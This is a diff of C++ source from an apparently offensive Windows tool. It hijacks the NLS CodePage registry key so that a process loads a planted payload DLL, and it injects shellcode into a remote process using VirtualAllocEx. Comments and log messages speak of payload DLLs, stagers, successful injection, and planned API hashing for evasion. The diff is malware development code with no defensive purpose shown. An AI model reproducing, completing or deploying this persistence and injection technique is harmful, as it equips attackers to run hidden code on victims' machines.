@@ -123,6 +123,7 @@ bool IterateCodePageAndExtractProperId(PRegistryKey regObject) {
 		{
 #ifdef _DEBUG
 			std::wprintf(L"Value with dll found in i = %d, %s = %s\n", i, CodePageID, ValueData);
+			//Convert from str to hex
 			CodePageInt = StringToInt(CodePageID);
 			std::wprintf(L"Code page as int is: %x\n", CodePageInt);
 #endif // _DEBUG
@@ -147,8 +148,9 @@ bool IterateCodePageAndExtractProperId(PRegistryKey regObject) {
 		if (status != ERROR_SUCCESS && status == ERROR_FILE_NOT_FOUND)
 		{
 			if (!RegSetValueExW(regObject->hSubkeyNls, ValueData, NULL, REG_SZ, (BYTE*)regObject->getStringBuffer(Index::DLL_NAME),
-				regObject->getStringSize(Index::FULL_PAYLOAD_DLL_PATH)))
+				regObject->getStringSize(Index::DLL_NAME)))
 			{
+				//std::wprintf(L"The string value of the data is: %s\n", ValueData);
 				uint32_t CodePageDecimal = StringToIntDecimal(ValueData);
 				std::printf("Sucessfully created dll payload in CodePage ID %x\n", CodePageInt);
 				regObject->setCodePageID(CodePageInt, CodePageIDIndex::CodePageHex);
@@ -239,8 +241,6 @@ void SelfSpawnPayload(DWORD dwCodePageId)
 }
 
 void InjectStagerToPayload(PRegistryKey regObject) {
-
-	//Write argument in remote process space
 	LPVOID lpCodePageID = (LPVOID)VirtualAllocEx(regObject->m_procInfo.hProcess, NULL, sizeof(DWORD), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (lpCodePageID == nullptr) {
 		std::printf("Could not allocate buffer in remote process\n");
@@ -276,11 +276,7 @@ void InjectStagerToPayload(PRegistryKey regObject) {
 	std::printf("Sucessfully injected to remote process, where shellcodeMemory is %p, and the codePageID is %d\n", ShellcodeMemory, codePageID);
 }
 
-//Main Bugs:
-// 3. OPTIONAL: Convert every single of the function as part of regObject
-//		-Implement Inheritance.
-//		-Implement API Hashing and dynamic resolving. (NOT pic).
-
+//Error of payload is at writing the payload.dll!
 bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
 {
 	bool bResult = false; 
@@ -298,12 +294,13 @@ bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
 		std::printf("Could not iterate key for proper modification. Last error: [0x%x]\n", GetLastError());
 		return bResult;
 	}
-	//DWORD dwCodePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
-	//SelfSpawnPayload(dwCodePageID);
-	if (CreateProcessToInject(&regObject->m_procInfo))
-	{
-		InjectStagerToPayload(regObject);
-	}
+	DWORD dwCodePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
+	std::printf("The code page ID is %d\n", dwCodePageID);
+	SelfSpawnPayload(dwCodePageID);
+	//if (CreateProcessToInject(&regObject->m_procInfo))
+	//{
+	//	InjectStagerToPayload(regObject);
+	//}
 
 	return bResult;
 }
